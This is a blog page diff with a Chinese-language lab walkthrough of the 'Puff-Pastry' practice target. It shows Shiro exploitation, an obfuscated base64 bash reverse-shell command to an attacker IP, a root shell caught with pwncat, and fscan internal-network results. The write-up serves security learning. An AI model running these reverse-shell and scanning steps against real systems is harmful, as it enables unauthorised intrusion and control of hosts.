@@ -1,0 +1,436 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="前言 在群里瞅见了这个靶机,没打过这种复杂环境的靶机,玩一下
+Puff-Pastry打靶记录 搭建 使用docker搭建,然后本地能够访问到一个8080端口 这里我最开始是使用的Windows docker,后面改成了使用虚拟机
+shiro 探测 java后端 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录
+这里出现了shiro的特征 Cookie中存在rememberme字段 shiro利用 直接上利用工具
+获取flag 拿一个反弹shell
+echo 'bash -i 5<>/dev/tcp/192.168.122.102/1234 0>&amp;5 1>&amp;5' | base64 bash -c {echo ,YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvMTIzNCAwPiY1IDE+JjUK}|{base64,-d}|{bash,-i} 成功拿到shell
+$ pwncat -l 1234 id uid=0(root) gid=0(root) groups=0(root) /usr/bin/script -qc /bin/bash /dev/null root@653a3ab3924e:/# 内网扫描 然后开始扫描内网.
+这里不知道为啥出现了三台机器(多了一台192.168.100.1),192.168.100.3才是我接下来要利用的thinkphp机器.
+root@74d34925b057:/tmp# ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.100.2 netmask 255.255.255.0 broadcast 192.168.110.255 ether 02:42:c0:a8:6e:02 txqueuelen 0 (Ethernet) RX packets 9369 bytes 10919294 (10.4 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6246 bytes 4921635 (4.6 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 2465 bytes 2566609 (2.4 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2465 bytes 2566609 (2.4 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@74d34925b057:/tmp# ./fscan -h 192.168.110.2/24 start infoscan (icmp) Target 192.168.100.1 is alive (icmp) Target 192.168.100.2 is alive (icmp) Target 192.168.100.3 is alive [*] Icmp alive hosts len is: 3 192.168.100.2:8080 open 192.168.100.1:8080 open 192.168.100.3:9000 open 192.168.100.3:80 open 192.168.100.1:22 open [*] alive ports len is: 5 start vulscan [+] FCGI 192.168.100.3:9000 Status: 403 Forbidden X-Powered-By: PHP/7.3.33 Content-type: text/html; charset=UTF-8 Access denied. stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions) plesa try other path,as -path /www/wwwroot/index.php [*] WebTitle http://192.168.100.1:8080 code:302 len:0 title:None 跳转url: http://192.168.100.1:8080/login;jsessionid=A4DC7661A1A9108ACF39363918EEC791 [*] WebTitle http://192.168.100.2:8080 code:302 len:0 title:None 跳转url: http://192.168.100.2:8080/login;jsessionid=64E76231AB0492BF3E940E05FEB02E58 [*] WebTitle http://192.168.100.3 code:200 len:931 title:None [*] WebTitle http://192.168.100.1:8080/login;jsessionid=A4DC7661A1A9108ACF39363918EEC791 code:200 len:2608 title:Login Page [*] WebTitle http://192.168.100.2:8080/login;jsessionid=64E76231AB0492BF3E940E05FEB02E58 code:200 len:2608 title:Login Page [+] PocScan http://192.168.100.1:8080/ poc-yaml-shiro-key [{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}] [+] PocScan http://192.168.100.2:8080/ poc-yaml-shiro-key [{mode cbc} {key kPH+bIxk5D2deZiIxcaaaA==}] [+] PocScan http://192.168.100.3 poc-yaml-thinkphp5-controller-rce 配置端口转发 192.168.122.102 wsl kali 192.168.100.2 shiro 192.168.100.3 thinkphp 现在的网络环境为 "><meta name=keywords content=",sec"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://l1uyun.one/posts/2024/08/puff-pastry%E6%89%93%E9%9D%B6/><title>Puff-Pastry打靶 | l1uyun☁️ — l1uyun's Blog
+</title><link rel=stylesheet href=/main.7ec86b545988b95db913eae589911b139b09ce5bdcae9ce4a659ba5efa58ffe3.css integrity="sha256-fshrVFmIuV25E+rliZEbE5sJzlvcrpzkplm6XvpY/+M="><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Puff-Pastry打靶"><meta itemprop=description content="前言 在群里瞅见了这个靶机,没打过这种复杂环境的靶机,玩一下
+Puff-Pastry打靶记录 搭建 使用docker搭建,然后本地能够访问到一个8080端口 这里我最开始是使用的Windows docker,后面改成了使用虚拟机
+shiro 探测 java后端 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录
+这里出现了shiro的特征 Cookie中存在rememberme字段 shiro利用 直接上利用工具
+获取flag 拿一个反弹shell
+echo 'bash -i 5<>/dev/tcp/192.168.122.102/1234 0>&amp;5 1>&amp;5' | base64 bash -c {echo ,YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvMTIzNCAwPiY1IDE+JjUK}|{base64,-d}|{bash,-i} 成功拿到shell
+$ pwncat -l 1234 id uid=0(root) gid=0(root) groups=0(root) /usr/bin/script -qc /bin/bash /dev/null root@653a3ab3924e:/# 内网扫描 然后开始扫描内网.
+这里不知道为啥出现了三台机器(多了一台192.168.100.1),192.168.100.3才是我接下来要利用的thinkphp机器.
+root@74d34925b057:/tmp# ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.100.2 netmask 255.255.255.0 broadcast 192.168.110.255 ether 02:42:c0:a8:6e:02 txqueuelen 0 (Ethernet) RX packets 9369 bytes 10919294 (10.4 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6246 bytes 4921635 (4.6 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 2465 bytes 2566609 (2.4 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2465 bytes 2566609 (2.4 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@74d34925b057:/tmp# ./fscan -h 192.168.110.2/24 start infoscan (icmp) Target 192.168.100.1 is alive (icmp) Target 192.168.100.2 is alive (icmp) Target 192.168.100.3 is alive [*] Icmp alive hosts len is: 3 192.168.100.2:8080 open 192.168.100.1:8080 open 192.168.100.3:9000 open 192.168.100.3:80 open 192.168.100.1:22 open [*] alive ports len is: 5 start vulscan [+] FCGI 192.168.100.3:9000 Status: 403 Forbidden X-Powered-By: PHP/7.3.33 Content-type: text/html; charset=UTF-8 Access denied. stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions) plesa try other path,as -path /www/wwwroot/index.php [*] WebTitle http://192.168.100.1:8080 code:302 len:0 title:None 跳转url: http://192.168.100.1:8080/login;jsessionid=A4DC7661A1A9108ACF39363918EEC791 [*] WebTitle http://192.168.100.2:8080 code:302 len:0 title:None 跳转url: http://192.168.100.2:8080/login;jsessionid=64E76231AB0492BF3E940E05FEB02E58 [*] WebTitle http://192.168.100.3 code:200 len:931 title:None [*] WebTitle http://192.168.100.1:8080/login;jsessionid=A4DC7661A1A9108ACF39363918EEC791 code:200 len:2608 title:Login Page [*] WebTitle http://192.168.100.2:8080/login;jsessionid=64E76231AB0492BF3E940E05FEB02E58 code:200 len:2608 title:Login Page [+] PocScan http://192.168.100.1:8080/ poc-yaml-shiro-key [{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}] [+] PocScan http://192.168.100.2:8080/ poc-yaml-shiro-key [{mode cbc} {key kPH+bIxk5D2deZiIxcaaaA==}] [+] PocScan http://192.168.100.3 poc-yaml-thinkphp5-controller-rce 配置端口转发 192.168.122.102 wsl kali 192.168.100.2 shiro 192.168.100.3 thinkphp 现在的网络环境为 "><meta itemprop=datePublished content="2024-08-18T11:59:41+00:00"><meta itemprop=dateModified content="2024-08-19T13:01:04+00:00"><meta itemprop=wordCount content="1682"><meta itemprop=keywords content="Sec"><meta name=twitter:card content="summary"><meta name=twitter:title content="Puff-Pastry打靶"><meta name=twitter:description content="前言 在群里瞅见了这个靶机,没打过这种复杂环境的靶机,玩一下
+Puff-Pastry打靶记录 搭建 使用docker搭建,然后本地能够访问到一个8080端口 这里我最开始是使用的Windows docker,后面改成了使用虚拟机
+shiro 探测 java后端 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录
+这里出现了shiro的特征 Cookie中存在rememberme字段 shiro利用 直接上利用工具
+获取flag 拿一个反弹shell
+echo 'bash -i 5<>/dev/tcp/192.168.122.102/1234 0>&amp;5 1>&amp;5' | base64 bash -c {echo ,YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvMTIzNCAwPiY1IDE+JjUK}|{base64,-d}|{bash,-i} 成功拿到shell
+$ pwncat -l 1234 id uid=0(root) gid=0(root) groups=0(root) /usr/bin/script -qc /bin/bash /dev/null root@653a3ab3924e:/# 内网扫描 然后开始扫描内网.
+这里不知道为啥出现了三台机器(多了一台192.168.100.1),192.168.100.3才是我接下来要利用的thinkphp机器.
+root@74d34925b057:/tmp# ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.100.2 netmask 255.255.255.0 broadcast 192.168.110.255 ether 02:42:c0:a8:6e:02 txqueuelen 0 (Ethernet) RX packets 9369 bytes 10919294 (10.4 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6246 bytes 4921635 (4.6 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 2465 bytes 2566609 (2.4 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2465 bytes 2566609 (2.4 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@74d34925b057:/tmp# ./fscan -h 192.168.110.2/24 start infoscan (icmp) Target 192.168.100.1 is alive (icmp) Target 192.168.100.2 is alive (icmp) Target 192.168.100.3 is alive [*] Icmp alive hosts len is: 3 192.168.100.2:8080 open 192.168.100.1:8080 open 192.168.100.3:9000 open 192.168.100.3:80 open 192.168.100.1:22 open [*] alive ports len is: 5 start vulscan [+] FCGI 192.168.100.3:9000 Status: 403 Forbidden X-Powered-By: PHP/7.3.33 Content-type: text/html; charset=UTF-8 Access denied. stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions) plesa try other path,as -path /www/wwwroot/index.php [*] WebTitle http://192.168.100.1:8080 code:302 len:0 title:None 跳转url: http://192.168.100.1:8080/login;jsessionid=A4DC7661A1A9108ACF39363918EEC791 [*] WebTitle http://192.168.100.2:8080 code:302 len:0 title:None 跳转url: http://192.168.100.2:8080/login;jsessionid=64E76231AB0492BF3E940E05FEB02E58 [*] WebTitle http://192.168.100.3 code:200 len:931 title:None [*] WebTitle http://192.168.100.1:8080/login;jsessionid=A4DC7661A1A9108ACF39363918EEC791 code:200 len:2608 title:Login Page [*] WebTitle http://192.168.100.2:8080/login;jsessionid=64E76231AB0492BF3E940E05FEB02E58 code:200 len:2608 title:Login Page [+] PocScan http://192.168.100.1:8080/ poc-yaml-shiro-key [{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}] [+] PocScan http://192.168.100.2:8080/ poc-yaml-shiro-key [{mode cbc} {key kPH+bIxk5D2deZiIxcaaaA==}] [+] PocScan http://192.168.100.3 poc-yaml-thinkphp5-controller-rce 配置端口转发 192.168.122.102 wsl kali 192.168.100.2 shiro 192.168.100.3 thinkphp 现在的网络环境为 "><meta property="og:url" content="https://l1uyun.one/posts/2024/08/puff-pastry%E6%89%93%E9%9D%B6/"><meta property="og:site_name" content="l1uyun☁️"><meta property="og:title" content="Puff-Pastry打靶"><meta property="og:description" content="前言 在群里瞅见了这个靶机,没打过这种复杂环境的靶机,玩一下
+Puff-Pastry打靶记录 搭建 使用docker搭建,然后本地能够访问到一个8080端口 这里我最开始是使用的Windows docker,后面改成了使用虚拟机
+shiro 探测 java后端 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录
+这里出现了shiro的特征 Cookie中存在rememberme字段 shiro利用 直接上利用工具
+获取flag 拿一个反弹shell
+echo 'bash -i 5<>/dev/tcp/192.168.122.102/1234 0>&amp;5 1>&amp;5' | base64 bash -c {echo ,YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvMTIzNCAwPiY1IDE+JjUK}|{base64,-d}|{bash,-i} 成功拿到shell
+$ pwncat -l 1234 id uid=0(root) gid=0(root) groups=0(root) /usr/bin/script -qc /bin/bash /dev/null root@653a3ab3924e:/# 内网扫描 然后开始扫描内网.
+这里不知道为啥出现了三台机器(多了一台192.168.100.1),192.168.100.3才是我接下来要利用的thinkphp机器.
+root@74d34925b057:/tmp# ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 192.168.100.2 netmask 255.255.255.0 broadcast 192.168.110.255 ether 02:42:c0:a8:6e:02 txqueuelen 0 (Ethernet) RX packets 9369 bytes 10919294 (10.4 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6246 bytes 4921635 (4.6 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 2465 bytes 2566609 (2.4 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2465 bytes 2566609 (2.4 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@74d34925b057:/tmp# ./fscan -h 192.168.110.2/24 start infoscan (icmp) Target 192.168.100.1 is alive (icmp) Target 192.168.100.2 is alive (icmp) Target 192.168.100.3 is alive [*] Icmp alive hosts len is: 3 192.168.100.2:8080 open 192.168.100.1:8080 open 192.168.100.3:9000 open 192.168.100.3:80 open 192.168.100.1:22 open [*] alive ports len is: 5 start vulscan [+] FCGI 192.168.100.3:9000 Status: 403 Forbidden X-Powered-By: PHP/7.3.33 Content-type: text/html; charset=UTF-8 Access denied. stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions) plesa try other path,as -path /www/wwwroot/index.php [*] WebTitle http://192.168.100.1:8080 code:302 len:0 title:None 跳转url: http://192.168.100.1:8080/login;jsessionid=A4DC7661A1A9108ACF39363918EEC791 [*] WebTitle http://192.168.100.2:8080 code:302 len:0 title:None 跳转url: http://192.168.100.2:8080/login;jsessionid=64E76231AB0492BF3E940E05FEB02E58 [*] WebTitle http://192.168.100.3 code:200 len:931 title:None [*] WebTitle http://192.168.100.1:8080/login;jsessionid=A4DC7661A1A9108ACF39363918EEC791 code:200 len:2608 title:Login Page [*] WebTitle http://192.168.100.2:8080/login;jsessionid=64E76231AB0492BF3E940E05FEB02E58 code:200 len:2608 title:Login Page [+] PocScan http://192.168.100.1:8080/ poc-yaml-shiro-key [{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}] [+] PocScan http://192.168.100.2:8080/ poc-yaml-shiro-key [{mode cbc} {key kPH+bIxk5D2deZiIxcaaaA==}] [+] PocScan http://192.168.100.3 poc-yaml-thinkphp5-controller-rce 配置端口转发 192.168.122.102 wsl kali 192.168.100.2 shiro 192.168.100.3 thinkphp 现在的网络环境为 "><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-18T11:59:41+00:00"><meta property="article:modified_time" content="2024-08-19T13:01:04+00:00"><meta property="article:tag" content="Sec"><meta property="article:published_time" content="2024-08-18 11:59:41 +0000 UTC"><script async src="https://www.googletagmanager.com/gtag/js?id=G-HV98V20MVF"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-HV98V20MVF")</script><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><meta name=referrer content="no-referrer-when-downgrade"><link rel=stylesheet href=https://unpkg.com/swiper/swiper-bundle.min.css><script src=https://unpkg.com/swiper/swiper-bundle.min.js></script><link rel=stylesheet href=/css/custom.css></head><body><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>$ cd /home/l1uyun☁️ </span><span class=logo__cursor style=background-color:#87ceeb></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li><li><a href=/about/>About</a></li></ul></nav><span class=menu-trigger><svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="22" height="22" viewBox="0 0 48 48" fill="none"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><p></p><hr><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
+<span class=tag><a href=https://l1uyun.one/tags/sec/>sec</a></span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+2024-08-18 11:59
+(Last updated: 2024-08-19 13:01)</p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+1682 Words
+<span>&nbsp;&nbsp;</span>
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+8 minutes</p></div><hr><article><h1 class=post-title><a href=https://l1uyun.one/posts/2024/08/puff-pastry%E6%89%93%E9%9D%B6/>Puff-Pastry打靶</a></h1><hr><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents><ul><li><a href=#搭建>搭建</a></li><li><a href=#shiro>shiro</a><ul><li><a href=#探测>探测</a></li><li><a href=#shiro利用>shiro利用</a></li><li><a href=#内网扫描>内网扫描</a></li><li><a href=#配置端口转发>配置端口转发</a></li></ul></li><li><a href=#thinkphp>thinkphp</a><ul><li><a href=#利用>利用</a></li><li><a href=#内网扫描-1>内网扫描</a></li><li><a href=#配置socks代理>配置socks代理</a></li></ul></li><li><a href=#redis>redis</a></li><li><a href=#phpmyadmin>phpmyadmin</a><ul><li><a href=#弱口令进入后台>弱口令进入后台</a></li><li><a href=#into-outfile写入webshell>into-outfile写入webshell</a></li><li><a href=#蚁剑>蚁剑</a></li><li><a href=#内网扫描-2>内网扫描</a></li><li><a href=#二重内网环境配置代理>二重内网环境配置代理</a></li></ul></li><li><a href=#struts>Struts</a></li><li><a href=#postgres>Postgres</a></li></ul></nav></aside><hr><div class=post-content><h1 id=前言>前言</h1><p>在群里瞅见了这个靶机,没打过这种复杂环境的靶机,玩一下</p><h1 id=puff-pastry打靶记录>Puff-Pastry打靶记录</h1><h2 id=搭建>搭建</h2><p>使用docker搭建,然后本地能够访问到一个8080端口
+<img alt=|207 src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_1.png>
+这里我最开始是使用的Windows docker,后面改成了使用虚拟机</p><h2 id=shiro>shiro</h2><h3 id=探测>探测</h3><p>java后端
+<img alt=|522 src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_2.png>
+进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录</p><p>这里出现了shiro的特征 Cookie中存在rememberme字段
+<img alt=|453 src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_3.png></p><h3 id=shiro利用>shiro利用</h3><p>直接上利用工具</p><p>获取flag
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_4.png></p><p>拿一个反弹shell</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#a5d6ff>&#39;bash -i 5&lt;&gt;/dev/tcp/192.168.122.102/1234 0&gt;&amp;5 1&gt;&amp;5&#39;</span> | base64
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>bash -c <span style=color:#ff7b72;font-weight:700>{</span>echo ,YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvMTIzNCAwPiY1IDE+JjUK<span style=color:#ff7b72;font-weight:700>}</span>|<span style=color:#ff7b72;font-weight:700>{</span>base64,-d<span style=color:#ff7b72;font-weight:700>}</span>|<span style=color:#ff7b72;font-weight:700>{</span>bash,-i<span style=color:#ff7b72;font-weight:700>}</span>
+</span></span></code></pre></div><p>成功拿到shell</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> $ pwncat  -l <span style=color:#a5d6ff>1234</span>
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span><span style=color:#79c0ff>uid</span><span style=color:#ff7b72;font-weight:700>=</span>0<span style=color:#ff7b72;font-weight:700>(</span>root<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>gid</span><span style=color:#ff7b72;font-weight:700>=</span>0<span style=color:#ff7b72;font-weight:700>(</span>root<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>groups</span><span style=color:#ff7b72;font-weight:700>=</span>0<span style=color:#ff7b72;font-weight:700>(</span>root<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>/usr/bin/script -qc /bin/bash /dev/null
+</span></span><span style=display:flex><span>root@653a3ab3924e:/# 
+</span></span></code></pre></div><h3 id=内网扫描>内网扫描</h3><p>然后开始扫描内网.</p><p>这里不知道为啥出现了三台机器(多了一台192.168.100.1),192.168.100.3才是我接下来要利用的thinkphp机器.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@74d34925b057:/tmp# ifconfig
+</span></span><span style=display:flex><span>eth0: <span style=color:#79c0ff>flags</span><span style=color:#ff7b72;font-weight:700>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style=color:#a5d6ff>1500</span>
+</span></span><span style=display:flex><span>        inet 192.168.100.2  netmask 255.255.255.0  broadcast 192.168.110.255
+</span></span><span style=display:flex><span>        ether 02:42:c0:a8:6e:02  txqueuelen <span style=color:#a5d6ff>0</span>  <span style=color:#ff7b72;font-weight:700>(</span>Ethernet<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>        RX packets <span style=color:#a5d6ff>9369</span>  bytes <span style=color:#a5d6ff>10919294</span> <span style=color:#ff7b72;font-weight:700>(</span>10.4 MiB<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>        RX errors <span style=color:#a5d6ff>0</span>  dropped <span style=color:#a5d6ff>0</span>  overruns <span style=color:#a5d6ff>0</span>  frame <span style=color:#a5d6ff>0</span>
+</span></span><span style=display:flex><span>        TX packets <span style=color:#a5d6ff>6246</span>  bytes <span style=color:#a5d6ff>4921635</span> <span style=color:#ff7b72;font-weight:700>(</span>4.6 MiB<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>        TX errors <span style=color:#a5d6ff>0</span>  dropped <span style=color:#a5d6ff>0</span> overruns <span style=color:#a5d6ff>0</span>  carrier <span style=color:#a5d6ff>0</span>  collisions <span style=color:#a5d6ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>lo: <span style=color:#79c0ff>flags</span><span style=color:#ff7b72;font-weight:700>=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span style=color:#a5d6ff>65536</span>
+</span></span><span style=display:flex><span>        inet 127.0.0.1  netmask 255.0.0.0
+</span></span><span style=display:flex><span>        loop  txqueuelen <span style=color:#a5d6ff>1000</span>  <span style=color:#ff7b72;font-weight:700>(</span>Local Loopback<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>        RX packets <span style=color:#a5d6ff>2465</span>  bytes <span style=color:#a5d6ff>2566609</span> <span style=color:#ff7b72;font-weight:700>(</span>2.4 MiB<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>        RX errors <span style=color:#a5d6ff>0</span>  dropped <span style=color:#a5d6ff>0</span>  overruns <span style=color:#a5d6ff>0</span>  frame <span style=color:#a5d6ff>0</span>
+</span></span><span style=display:flex><span>        TX packets <span style=color:#a5d6ff>2465</span>  bytes <span style=color:#a5d6ff>2566609</span> <span style=color:#ff7b72;font-weight:700>(</span>2.4 MiB<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>        TX errors <span style=color:#a5d6ff>0</span>  dropped <span style=color:#a5d6ff>0</span> overruns <span style=color:#a5d6ff>0</span>  carrier <span style=color:#a5d6ff>0</span>  collisions <span style=color:#a5d6ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>root@74d34925b057:/tmp# ./fscan -h 192.168.110.2/24
+</span></span><span style=display:flex><span>start infoscan
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span>icmp<span style=color:#ff7b72;font-weight:700>)</span> Target 192.168.100.1   is alive
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span>icmp<span style=color:#ff7b72;font-weight:700>)</span> Target 192.168.100.2   is alive
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span>icmp<span style=color:#ff7b72;font-weight:700>)</span> Target 192.168.100.3   is alive
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Icmp alive hosts len is: <span style=color:#a5d6ff>3</span>
+</span></span><span style=display:flex><span>192.168.100.2:8080 open
+</span></span><span style=display:flex><span>192.168.100.1:8080 open
+</span></span><span style=display:flex><span>192.168.100.3:9000 open
+</span></span><span style=display:flex><span>192.168.100.3:80 open
+</span></span><span style=display:flex><span>192.168.100.1:22 open
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> alive ports len is: <span style=color:#a5d6ff>5</span>
+</span></span><span style=display:flex><span>start vulscan
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> FCGI 192.168.100.3:9000
+</span></span><span style=display:flex><span>Status: <span style=color:#a5d6ff>403</span> Forbidden
+</span></span><span style=display:flex><span>X-Powered-By: PHP/7.3.33
+</span></span><span style=display:flex><span>Content-type: text/html; <span style=color:#79c0ff>charset</span><span style=color:#ff7b72;font-weight:700>=</span>UTF-8
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Access denied.
+</span></span><span style=display:flex><span>stderr:Access to the script <span style=color:#a5d6ff>&#39;/etc/issue&#39;</span> has been denied <span style=color:#ff7b72;font-weight:700>(</span>see security.limit_extensions<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>plesa try other path,as -path /www/wwwroot/index.php
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> WebTitle http://192.168.100.1:8080 code:302 len:0      title:None 跳转url: http://192.168.100.1:8080/login;<span style=color:#79c0ff>jsessionid</span><span style=color:#ff7b72;font-weight:700>=</span>A4DC7661A1A9108ACF39363918EEC791
